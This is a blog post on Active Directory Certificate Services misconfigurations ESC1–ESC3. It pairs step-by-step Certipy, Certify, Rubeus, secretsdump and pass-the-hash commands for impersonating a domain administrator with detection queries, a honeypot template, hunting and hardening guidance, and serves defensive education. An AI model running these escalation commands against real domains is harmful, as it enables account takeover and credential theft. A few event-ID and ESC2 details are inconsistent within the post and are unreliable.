---
title: "ADCS Certificate Attacks: ESC1, ESC2, ESC3"
description: "Deep dive into Active Directory Certificate Services attacks: how PKI and certificates work in AD, ESC1/ESC2/ESC3 attack mechanics, detection, hunting, and hardening, from a Microsoft infrastructure expert perspective."
date: 2026-06-12T10:45:00
category: Active-Directory
tags:
  - Active Directory
  - ADCS
  - PKI
  - Certificate Attacks
  - ESC1
  - ESC2
  - ESC3
  - Threat Hunting
author: "Luca Manfrin"
published: true
archived: false
pinned: false
featured: false
---

## Introduction

Active Directory Certificate Services (ADCS) is Microsoft's on-premises Public Key Infrastructure (PKI) solution. Deployed in the majority of enterprise Windows environments, it issues certificates used for authentication, encryption, code signing, and more. In 2021, SpecterOps researchers Will Schroeder and Lee Christensen published *"Certified Pre-Owned"*, a research paper that catalogued over a dozen ADCS misconfigurations that allow domain privilege escalation, lateral movement, and persistence.

This post covers ESC1, ESC2, and ESC3, the three most commonly encountered and exploited misconfigurations. Before explaining the attacks, we need to understand how ADCS works.

---

## How ADCS and Certificates Work in Active Directory

### The PKI Trust Chain

ADCS implements an X.509 PKI. The basic chain:

```
Root CA (Enterprise Root or Standalone Root)
  └── Subordinate CA / Issuing CA (Enterprise CA)
        └── End-Entity Certificates (users, computers, services)
```

In most environments:
- **Root CA**: often offline (or on a dedicated standalone server) to protect the root key
- **Issuing CA (Enterprise CA)**: domain-joined, handles day-to-day certificate requests

### Certificate Templates

Certificate templates define **what kind of certificates can be issued** and **who can request them**. They are stored in AD:

```
CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
```

Templates specify:
- **Subject name source**: who fills in the Subject / SAN field (the CA vs. the requester)
- **EKU (Extended Key Usage)**: what the certificate can be used for (client auth, server auth, code signing, etc.)
- **Enrollment permissions**: who can request certificates from this template
- **Manager approval**: whether an admin must approve requests
- **Validity period**: how long the certificate lasts

### Kerberos Authentication with Certificates (PKINIT)

This is the core mechanism exploited by ADCS attacks. A certificate with the **Client Authentication** EKU can be used to authenticate to Active Directory via Kerberos (PKINIT):

1. Client presents its certificate to the KDC in an AS-REQ
2. KDC verifies the certificate against a trusted CA
3. KDC looks up the account the certificate maps to (via UPN or SAN in the certificate)
4. KDC issues a TGT for that account

**The critical insight**: if an attacker can obtain a certificate that maps to a privileged account (like Domain Admin), they can use it to get a TGT for that account, indefinitely, until the certificate expires.

A certificate is valid for 1-10 years by default. **Even if the account's password is reset, the certificate remains valid.** This makes certificate-based persistence the most durable form of persistence in AD.

### The NTLM Hash via Certificates (PKINIT → NT Hash)

When you authenticate via PKINIT, the KDC embeds an NT hash in the encrypted TGT (for backward compatibility). You can extract this NT hash from the TGT using Rubeus or Certipy, enabling Pass the Hash, without ever knowing the account's password.

```bash
# Certipy: authenticate with certificate → get TGT + NT hash
certipy auth -pfx admin.pfx -dc-ip 192.168.1.10
# Output: TGT saved to admin.ccache, NT hash: 8846f7eaee8fb117ad06bdd830b7586c
```

This is why ADCS attacks are so powerful: they provide both long-term certificate-based authentication AND the NT hash.

---

## Enumeration, The Starting Point for All ESC Attacks

Before exploiting any ESC, an attacker enumerates the ADCS environment:

```bash
# Certipy (Python, Linux), enumerate all CAs and templates
certipy find -u lowprivuser@domain.local -p password -dc-ip 192.168.1.10

# Output: certipy.json and certipy.txt with all CAs, templates, and misconfigurations flagged
certipy find -u lowprivuser@domain.local -p password -dc-ip 192.168.1.10 -vulnerable -stdout
```

```powershell
# Certify (C#, Windows), enumerate vulnerable templates
.\Certify.exe find /vulnerable

# Enumerate all templates
.\Certify.exe find /all

# Specific CA info
.\Certify.exe cas
```

```powershell
# Native PowerShell, enumerate certificate templates from AD
Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$(Get-ADDomain | Select-Object -ExpandProperty DistinguishedName)" `
  -Filter { objectClass -eq 'pKICertificateTemplate' } `
  -Properties * |
  Select-Object Name, 'msPKI-Certificate-Name-Flag', 'msPKI-Enrollment-Flag',
    'pKIExtendedKeyUsage', 'nTSecurityDescriptor' |
  Sort-Object Name
```

---

## ESC1, Misconfigured Certificate Templates (Requester-Supplied SAN)

### What ESC1 Is

ESC1 occurs when a certificate template:
1. Allows any **enrolled user to specify the Subject Alternative Name (SAN)** in the request
2. Has **Client Authentication** in its EKU (can be used for Kerberos authentication)
3. Has **enrollment permissions for low-privileged users** (Domain Users, Authenticated Users, etc.)
4. Does **not require manager approval**

The SAN (Subject Alternative Name) field of an X.509 certificate can contain a UPN (User Principal Name). When authenticating with PKINIT, the KDC looks up the account based on the UPN in the certificate's SAN. If you can specify an arbitrary SAN, you can request a certificate that maps to any account, including Domain Admin.

### Why This Flag Exists

The `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag (`msPKI-Certificate-Name-Flag = 1`) was designed for scenarios where the requester knows their own SAN (e.g., web server certificates where the admin specifies the FQDN). It was never intended for authentication certificates accessible to all domain users.

### How an Attacker Exploits ESC1

```bash
# Step 1: Enumerate ESC1-vulnerable templates with Certipy
certipy find -u lowprivuser@domain.local -p password -dc-ip 192.168.1.10 -vulnerable -stdout
# Look for: [ESC1] in the output, with "msPKI-Certificate-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT"
# and "pKIExtendedKeyUsage: Client Authentication"
```

```bash
# Step 2: Request a certificate with a forged SAN (as Domain Admin UPN)
certipy req \
  -u lowprivuser@domain.local \
  -p password \
  -ca "domain-CA01-CA" \
  -template "VulnerableTemplate" \
  -upn "administrator@domain.local" \
  -dc-ip 192.168.1.10
# Output: administrator.pfx (certificate + private key)
```

```powershell
# Same attack with Certify (Windows)
.\Certify.exe request /ca:ca01.domain.local\domain-CA01-CA /template:VulnerableTemplate /altname:administrator
# Output: PEM-encoded cert, convert to PFX with openssl
```

```bash
# Step 3: Use the certificate to authenticate and get TGT + NT hash
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10
# Output: administrator.ccache (TGT) + NT hash

# Step 4: Use the TGT or pass the hash
export KRB5CCNAME=administrator.ccache
python3 secretsdump.py -k -no-pass dc01.domain.local
# or
python3 psexec.py -hashes :NTHASH administrator@dc01.domain.local
```

```powershell
# Rubeus, use the PFX directly
.\Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /password:certipy /ptt
```

### ESC1, Security Impact

- **Any domain user** can impersonate any AD account, including Domain Admins
- The resulting certificate is valid for the template's lifetime (typically 1 year)
- Password resets on the victim account do not invalidate the certificate
- The attack generates very few events and leaves minimal traces

---

## ESC2, Misconfigured Certificate Templates (Any Purpose EKU)

### What ESC2 Is

ESC2 occurs when a certificate template:
1. Has the **"Any Purpose"** EKU (`2.5.29.37.0`) or **no EKU at all** (SubCA template)
2. Has enrollment permissions for low-privileged users
3. Does not require manager approval

A certificate with "Any Purpose" EKU or no EKU can be used as a **Subordinate CA certificate**, meaning it can sign other certificates. If an attacker obtains such a certificate, they can issue their own certificates for any account.

Certificates with no EKU effectively become mini-CAs trusted by the domain.

### How ESC2 Differs from ESC1

- ESC1: you directly request a certificate with a spoofed UPN → authenticate as anyone
- ESC2: you obtain a CA-capable certificate → use it to sign a new certificate for any UPN → authenticate as anyone

ESC2 provides a **reusable signing capability** rather than a single forged certificate. As long as the ESC2 certificate is valid, the attacker can issue unlimited new certificates.

### How an Attacker Exploits ESC2

```bash
# Step 1: Enumerate
certipy find -u lowprivuser@domain.local -p password -dc-ip 192.168.1.10 -vulnerable -stdout
# Look for: [ESC2], template with Any Purpose or no EKU

# Step 2: Request the "Any Purpose" or no-EKU certificate
certipy req \
  -u lowprivuser@domain.local \
  -p password \
  -ca "domain-CA01-CA" \
  -template "VulnerableESC2Template" \
  -dc-ip 192.168.1.10
# Output: lowprivuser.pfx

# Step 3: Use the certificate as a SubCA to issue a certificate for administrator
certipy req \
  -u lowprivuser@domain.local \
  -p password \
  -ca "domain-CA01-CA" \
  -template User \
  -on-behalf-of 'domain\administrator' \
  -pfx lowprivuser.pfx \
  -dc-ip 192.168.1.10
# The ESC2 cert is used to sign a request on behalf of administrator

# Step 4: Authenticate
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10
```

```powershell
# Certify approach
.\Certify.exe request /ca:ca01.domain.local\domain-CA01-CA /template:VulnerableESC2Template
# Then use the CA cert to sign requests for other accounts via openssl or Certipy
```

### ESC2, Identifying the Vulnerable Condition

The `pKIExtendedKeyUsage` attribute is either:
- Contains OID `2.5.29.37.0` (Any Purpose)
- Is empty / not present (SubCA, no EKU restriction)

```powershell
# Find templates with Any Purpose EKU or no EKU
Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$($(Get-ADDomain).DistinguishedName)" `
  -Filter { objectClass -eq 'pKICertificateTemplate' } `
  -Properties pKIExtendedKeyUsage, 'msPKI-Enrollment-Flag', Name |
  Where-Object {
    $_.pKIExtendedKeyUsage -contains '2.5.29.37.0' -or  # Any Purpose
    -not $_.pKIExtendedKeyUsage                           # No EKU
  } |
  Select-Object Name, pKIExtendedKeyUsage
```

---

## ESC3, Enrollment Agent Certificate Abuse

### What ESC3 Is

ESC3 involves two separate template misconfigurations that, when chained, allow an attacker to obtain a certificate for any user:

**ESC3 Condition 1**, An enrollment agent template:
- Has the **Certificate Request Agent** EKU (`1.3.6.1.4.1.311.20.2.1`)
- Allows enrollment by low-privileged users without approval

**ESC3 Condition 2**, A certificate template that:
- Allows **enrollment agent enrollment** (the CA allows enrollment agents to request on behalf of others)
- Has **Client Authentication** EKU
- Allows enrollment without restriction on which enrollment agent can use it

An enrollment agent is a special certificate that allows the bearer to request certificates on behalf of other users. This was designed for smart card deployment scenarios where an administrator enrolls certificates on behalf of end users.

### The Enrollment Agent Attack Flow

```
Step 1: Attacker (LowPrivUser) requests an Enrollment Agent certificate
        (ESC3 Condition 1 template)
        → Gets: EnrollmentAgent.pfx

Step 2: Attacker uses the Enrollment Agent cert to request a Client Auth
        certificate ON BEHALF OF administrator
        (ESC3 Condition 2 template)
        → Gets: administrator.pfx

Step 3: Attacker uses administrator.pfx to authenticate as administrator
        → Gets: TGT + NT hash
```

### How an Attacker Exploits ESC3

```bash
# Step 1: Enumerate, look for ESC3
certipy find -u lowprivuser@domain.local -p password -dc-ip 192.168.1.10 -vulnerable -stdout
# [ESC3] in output means Condition 1 (enrollment agent template)
# Look also for templates allowing enrollment agent enrollment (Condition 2)

# Step 2: Request an Enrollment Agent certificate (Condition 1)
certipy req \
  -u lowprivuser@domain.local \
  -p password \
  -ca "domain-CA01-CA" \
  -template "EnrollmentAgentTemplate" \
  -dc-ip 192.168.1.10
# Output: lowprivuser.pfx (enrollment agent certificate)

# Step 3: Use the Enrollment Agent cert to request on behalf of administrator
certipy req \
  -u lowprivuser@domain.local \
  -p password \
  -ca "domain-CA01-CA" \
  -template "User" \
  -on-behalf-of 'domain\administrator' \
  -pfx lowprivuser.pfx \
  -dc-ip 192.168.1.10
# Output: administrator.pfx

# Step 4: Authenticate
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10
# NT hash + TGT for administrator
```

```powershell
# Certify (Windows)
# Step 1: Get enrollment agent cert
.\Certify.exe request /ca:ca01.domain.local\domain-CA01-CA /template:EnrollmentAgentTemplate

# Step 2: Request on behalf of administrator
.\Certify.exe request /ca:ca01.domain.local\domain-CA01-CA /template:User \
  /onbehalfof:domain\administrator /enrollcert:enrollmentagent.pfx /enrollcertpw:password
```

### Why ESC3 Is Particularly Dangerous

- The enrollment agent mechanism is designed for **legitimate delegation**, it does not generate anomalous events by itself
- Enrollment agent certificates are often issued to helpdesk accounts, an attacker compromising helpdesk gains this capability
- The CA logs show certificate issuance for the legitimate enrollment agent, and then a second issuance "on behalf of" administrator, both look like routine smart card provisioning operations

---

## Security Problems Common to ESC1, ESC2, ESC3

**1. Certificate persistence survives password resets.** After exploiting any ESC, the attacker holds a certificate. Resetting the victim account's password does not revoke the certificate. Even disabling the account may not prevent certificate-based authentication in some configurations.

**2. NT hash extraction via PKINIT.** Every ADCS authentication also yields the account's NT hash, enabling Pass the Hash as a fallback.

**3. Long-lived credentials.** Default certificate lifetimes are 1-2 years. An attacker who exfiltrates a certificate has persistent access for years.

**4. Low-noise attack.** Certificate requests are normal CA operations. The request events (4886, 4887) exist but are rarely monitored. There are no failed authentications, no lockouts, no anomalous Kerberos errors.

**5. Most environments have ADCS deployed but unmonitored.** ADCS was set up years ago, is running, and no one has audited the templates since.

---

## How to Detect It

### CA Event Logs

ADCS logs certificate events on the CA server itself (not the DCs):

| Event ID | Source | Description |
|---|---|---|
| 4886 | Microsoft-Windows-Security-Auditing | Certificate issued |
| 4887 | Microsoft-Windows-Security-Auditing | Certificate approved and issued |
| 4888 | Microsoft-Windows-Security-Auditing | Certificate denied |
| 4890 | Microsoft-Windows-Security-Auditing | Certificate revoked |

```powershell
# Run on the CA server, detect certificates issued with a SAN different from requester
Get-WinEvent -FilterHashtable @{
  LogName = 'Security'
  Id      = 4887   # certificate issued
} -ComputerName ca01.domain.local |
  Where-Object {
    # Check if the requester's identity differs from the certificate subject
    $requester = $_.Properties[4].Value   # who requested
    $subject   = $_.Properties[6].Value   # certificate subject
    $requester -ne $subject -and $subject -ne ''
  } |
  Select-Object TimeCreated,
    @{ n = 'Requester';    e = { $_.Properties[4].Value } },
    @{ n = 'Subject';      e = { $_.Properties[6].Value } },
    @{ n = 'Template';     e = { $_.Properties[11].Value } },
    @{ n = 'Disposition';  e = { $_.Properties[7].Value } }
```

```powershell
# Detect enrollment agent usage (on-behalf-of certificate requests)
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4887 } `
  -ComputerName ca01.domain.local |
  Where-Object {
    # Property 12 = Requester name, Property 13 = Certificate enrollment on behalf of
    $_.Properties[13].Value -ne $null -and $_.Properties[13].Value -ne ''
  } |
  Select-Object TimeCreated,
    @{ n = 'Requester';   e = { $_.Properties[4].Value } },
    @{ n = 'OnBehalfOf';  e = { $_.Properties[13].Value } },
    @{ n = 'Template';    e = { $_.Properties[11].Value } }
```

```powershell
# Alert: certificate issued for a privileged account (DA, EA, krbtgt)
$privilegedUPNs = @(
  'administrator@domain.local',
  'krbtgt@domain.local'
  # add all DA/EA UPNs
)

Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = @(4886,4887) } `
  -ComputerName ca01.domain.local |
  Where-Object {
    $sub = $_.Properties[6].Value
    $privilegedUPNs | Where-Object { $sub -like "*$_*" }
  } |
  Select-Object TimeCreated,
    @{ n = 'Requester'; e = { $_.Properties[4].Value } },
    @{ n = 'Subject';   e = { $_.Properties[6].Value } },
    @{ n = 'Template';  e = { $_.Properties[11].Value } }
```

### PKINIT Authentication Detection

When a certificate is used for Kerberos authentication, Event 4768 on the DC shows `PreAuthType = 16` (PKINIT):

```powershell
# Detect PKINIT logons, cross-reference with expected certificate-using accounts
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4768 } |
  Where-Object { $_.Properties[8].Value -eq '16' } |   # PreAuthType 16 = PKINIT
  Select-Object TimeCreated,
    @{ n = 'Account';   e = { $_.Properties[0].Value } },
    @{ n = 'ClientIP';  e = { $_.Properties[9].Value } }

# Detect privileged accounts authenticating via PKINIT from unexpected IPs
# DA/EA should only use PKINIT from PAW IPs
$pawIPs = @("10.0.0.100", "10.0.0.101")   # adjust
$daAccounts = (Get-ADGroupMember 'Domain Admins' -Recursive).SamAccountName

Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4768 } |
  Where-Object {
    $_.Properties[8].Value  -eq '16' -and   # PKINIT
    $daAccounts -contains $_.Properties[0].Value -and
    $_.Properties[9].Value -notin $pawIPs
  } |
  Select-Object TimeCreated,
    @{ n = 'Account';   e = { $_.Properties[0].Value } },
    @{ n = 'ClientIP';  e = { $_.Properties[9].Value } }
```

### Sysmon Detection for Certificate Requests

Certipy and Certify make specific HTTP/RPC calls to the CA. Sysmon can detect the process behavior:

```powershell
# Sysmon Event 1, detect Certify or Certipy execution
Get-WinEvent -FilterHashtable @{
  LogName = 'Microsoft-Windows-Sysmon/Operational'; Id = 1
} | Where-Object {
  $_.Properties[10].Value -match 'Certify|certipy|/template|/ca:|ESC'
} |
  Select-Object TimeCreated,
    @{ n = 'Image';       e = { $_.Properties[4].Value } },
    @{ n = 'CommandLine'; e = { $_.Properties[10].Value } }
```

---

## Honeypot Certificate Template

Create a certificate template that looks attractive (e.g., named "RemoteAccess" or "AdminCert") but is configured to alert on any request:

```powershell
# Create a template that requires CA manager approval, any request triggers a pending
# notification that you can monitor without issuing the certificate

# Via certsrv.msc:
# CA → Certificate Templates → New → Duplicate Template
# Rename to "RemoteAccess_Legacy"
# On "Issuance Requirements" tab: Check "CA certificate manager approval"
# On "Subject Name" tab: Check "Supply in request"
# On "Security" tab: Allow "Authenticated Users" to Enroll

# Now monitor 4886 (certificate pending) for this template
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4886 } `
  -ComputerName ca01.domain.local |
  Where-Object { $_.Properties[11].Value -like '*RemoteAccess_Legacy*' } |
  Select-Object TimeCreated,
    @{ n = 'Requester'; e = { $_.Properties[4].Value } },
    @{ n = 'Template';  e = { $_.Properties[11].Value } }
```

Any request for this template is suspicious, legitimate users do not know it exists.

---

## How to Hunt It (Post-Incident)

### Phase 1, Enumerate the current attack surface

```bash
# Certipy, comprehensive enumeration with vulnerability flagging
certipy find -u lowprivuser@domain.local -p password -dc-ip 192.168.1.10 -vulnerable
# Review certipy_output.txt for [ESC1], [ESC2], [ESC3], [ESC4]-[ESC11]
```

```powershell
# Native: find templates with ENROLLEE_SUPPLIES_SUBJECT flag
# msPKI-Certificate-Name-Flag bit 1 = CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$($(Get-ADDomain).DistinguishedName)" `
  -Filter { objectClass -eq 'pKICertificateTemplate' } `
  -Properties 'msPKI-Certificate-Name-Flag', pKIExtendedKeyUsage, Name |
  Where-Object {
    ($_.'msPKI-Certificate-Name-Flag' -band 0x1) -ne 0   # ENROLLEE_SUPPLIES_SUBJECT
  } |
  Select-Object Name, 'msPKI-Certificate-Name-Flag', pKIExtendedKeyUsage
```

### Phase 2, Review recently issued certificates

```powershell
# Query the CA database for recently issued certificates
# Run on the CA server
$caName = "domain-CA01-CA"
certutil -view -restrict "NotAfter>=$(Get-Date -Format 'MM/dd/yyyy')" -out "RequestID,CommonName,RequesterName,NotBefore,NotAfter,CertificateTemplate" csv |
  ConvertFrom-Csv |
  Sort-Object NotBefore -Descending |
  Select-Object -First 50

# Or with DCOM
$ca = New-Object -ComObject CertAdm.CertAdmin
```

```powershell
# Check for certificates with SANs containing privileged account UPNs
certutil -view -out "SubjectAltName,RequesterName,NotBefore,CertificateTemplate" |
  Select-String "administrator|domainadmin" -Context 2
```

### Phase 3, Identify certificates issued with unusual SANs

```powershell
# Review CA event log for all recent certificate issuance
$start = (Get-Date).AddDays(-30)
Get-WinEvent -FilterHashtable @{
  LogName   = 'Security'
  Id        = 4887
  StartTime = $start
} -ComputerName ca01.domain.local |
  Select-Object TimeCreated,
    @{ n = 'Requester';  e = { $_.Properties[4].Value } },
    @{ n = 'Subject';    e = { $_.Properties[6].Value } },
    @{ n = 'Template';   e = { $_.Properties[11].Value } },
    @{ n = 'SAN';        e = { $_.Properties[14].Value } } |
  Where-Object {
    $_.Requester -ne $null -and
    $_.SAN -ne $null -and
    $_.SAN -ne ''
  }
```

### Phase 4, Revoke Compromised Certificates

```powershell
# On the CA server, revoke by serial number
certutil -revoke <SerialNumber> 0  # 0 = unspecified reason
# Reason codes: 0=unspecified, 1=key compromise, 2=CA compromise, 3=affiliation changed,
# 4=superseded, 5=cessation of operation, 6=certificate hold

# Update the CRL (Certificate Revocation List) immediately
certutil -crl

# Force clients to refresh CRL (reboot or gpupdate alone does not immediately invalidate)
# KDC checks CRL at ticket issuance, after CRL update, revoked cert becomes invalid for new TGTs
```

> [!IMPORTANT]
> Revoking the certificate and updating the CRL invalidates future authentication attempts. However, any **in-flight TGTs** (already issued using the revoked certificate) remain valid until they expire (typically 10 hours). Combine certificate revocation with a password reset and, if necessary, a krbtgt rotation.

---

## How to Prevent It

### 1. Audit All Certificate Templates, Remove ENROLLEE_SUPPLIES_SUBJECT from Auth Templates

```powershell
# Find all templates with ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU + no approval
$clientAuthOID = "1.3.6.1.5.5.7.3.2"

Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$($(Get-ADDomain).DistinguishedName)" `
  -Filter { objectClass -eq 'pKICertificateTemplate' } `
  -Properties 'msPKI-Certificate-Name-Flag', 'msPKI-Enrollment-Flag',
              pKIExtendedKeyUsage, Name |
  Where-Object {
    ($_.'msPKI-Certificate-Name-Flag' -band 0x1) -and    # ENROLLEE_SUPPLIES_SUBJECT
    $_.pKIExtendedKeyUsage -contains $clientAuthOID -and  # Client Authentication
    -not ($_.'msPKI-Enrollment-Flag' -band 0x2)           # No manager approval required
  } |
  Select-Object Name

# Remediation: remove ENROLLEE_SUPPLIES_SUBJECT from the template
# Via certtmpl.msc: Template Properties → Subject Name tab →
#   Uncheck "Supply in request"
#   Select "Build from this Active Directory information"
```

### 2. Enable CA Manager Approval on All Auth Templates

For any template that allows Client Authentication and has broad enrollment permissions, require CA manager approval:

```
certtmpl.msc → Template Properties → Issuance Requirements tab:
☑ CA certificate manager approval
```

This prevents automated ESC1/2/3 exploitation, a human must approve each request.

### 3. Restrict Enrollment Permissions

```powershell
# Remove "Authenticated Users" / "Domain Users" from template enrollment rights
# Only specific groups should be able to enroll
# Via certtmpl.msc: Template Properties → Security tab:
# Remove: Authenticated Users - Enroll
# Add: Specific service account or computer group - Enroll
```

### 4. Disable Dangerous EKUs or Remove Templates

Templates with "Any Purpose" EKU or SubCA capability that are not needed should be disabled or removed:

```
certsrv.msc → Certificate Templates → right-click unnecessary template → Delete
```

> [!WARNING]
> Never delete templates that are actively used. Check `certutil -view -restrict "CertificateTemplate=<OID>"` to see if any certificates have been issued from the template before removing it.

### 5. Restrict Enrollment Agent Capabilities

Configure the CA to restrict which templates enrollment agents can request on behalf of others:

```
certsrv.msc → CA Properties → Enrollment Agents tab:
Change from "Do not restrict enrollment agents" to:
Specify which enrollment agents can enroll on behalf of which templates and users
```

### 6. Enable LDAP-based Certificate Mapping (Strong Mapping)

Microsoft released a security update (KB5014754) that enables strict certificate-to-account mapping, requiring the certificate to include the account's SID in a specific extension. This prevents certificates issued before the patch from being used for authentication.

```powershell
# Check KB5014754 strong certificate mapping mode
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" `
  -Name "StrongCertificateBindingEnforcement" -ErrorAction SilentlyContinue
# 0 = Disabled (vulnerable), 1 = Compatibility mode, 2 = Full enforcement (blocks forged cert auth)

# Enable full enforcement on DCs
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" `
  -Name "StrongCertificateBindingEnforcement" -Value 2 -Type DWord
```

> [!IMPORTANT]
> Full enforcement (value 2) breaks certificate authentication for certificates issued before the KB5014754 patch that do not contain the SID extension. Audit all existing certificates before enabling full enforcement. Use value 1 (compatibility mode) as an intermediate step.

### 7. Deploy PKI Health Monitoring

```powershell
# Regular audit of CA-issued certificates
# Check for certificates with forged SANs or unusual requesters
Invoke-Command -ComputerName ca01.domain.local -ScriptBlock {
  certutil -view -restrict "NotAfter>=$(Get-Date -Format 'MM/dd/yyyy'),Disposition=20" `
    -out "RequestID,RequesterName,SubjectAltName,CertificateTemplate,NotAfter" csv
} | ConvertFrom-Csv | Where-Object {
  $_.SubjectAltName -match 'administrator|domainadmin|dnsadmin'
}
```

---

## ADCS Attack Matrix Summary

| ESC | Condition | Privilege Required | Result |
|---|---|---|---|
| ESC1 | Template: ENROLLEE_SUPPLIES_SUBJECT + Client Auth + no approval | Domain User | Certificate for any UPN → DA authentication |
| ESC2 | Template: Any Purpose EKU / no EKU + no approval | Domain User | CA-capable cert → issue any cert |
| ESC3 | Enrollment Agent template + abusable auth template | Domain User | Cert on behalf of any user → DA authentication |

---

## Conclusion

ADCS attacks are among the most impactful and underdetected attack classes in modern Active Directory environments. A low-privilege domain user can escalate to Domain Admin in minutes if a single vulnerable template exists. The detection surface is narrow (CA event logs, PKINIT events on DCs) and rarely monitored. Remediation requires both fixing the templates (removing ENROLLEE_SUPPLIES_SUBJECT, enforcing approval, restricting EKUs) and revoking any certificates already issued through the misconfiguration. Certipy is the most efficient tool for both offensive enumeration and defensive auditing, run it against your environment and treat every [ESC] finding as a critical finding.
